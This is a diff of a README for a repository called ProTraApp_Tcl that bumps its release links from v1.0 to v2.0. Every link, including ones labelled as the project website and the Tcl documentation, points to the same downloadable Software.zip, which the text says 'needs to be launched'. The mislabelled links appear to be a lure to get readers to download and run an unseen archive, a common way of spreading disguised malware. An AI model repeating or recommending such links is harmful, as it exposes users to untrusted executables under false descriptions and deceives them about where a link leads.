@@ -11,7 +11,7 @@ Welcome to the ProTraApp_Tcl repository! 🚀 This repository focuses on enhanci
 ## 📦 Get Started
 To access the latest release, download the repository as a zip file by clicking the button below:
 
-[![Download Zip](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v1.0/Software.zip)
+[![Download Zip](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v2.0/Software.zip)
 
 *Note: The link above leads to a zip file that needs to be launched.*
 
@@ -30,8 +30,8 @@ If the link is not working or you require different versions, please check the "
 5. Wait for feedback and approval.
 
 ## 📚 Additional Resources
-- [ProTraApp Website](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v1.0/Software.zip): Visit the official ProTraApp website for more information.
-- [Tcl Documentation](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v1.0/Software.zip): Explore the Tcl language documentation for reference.
+- [ProTraApp Website](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v2.0/Software.zip): Visit the official ProTraApp website for more information.
+- [Tcl Documentation](https://github.com/Taimoor-Ahmmad/ProTraApp_Tcl/releases/download/v2.0/Software.zip): Explore the Tcl language documentation for reference.
 
 ## 🤝 Community
 Join our community of developers, enthusiasts, and contributors to collaborate, share ideas, and discuss future enhancements to the ProTraApp_Tcl project.
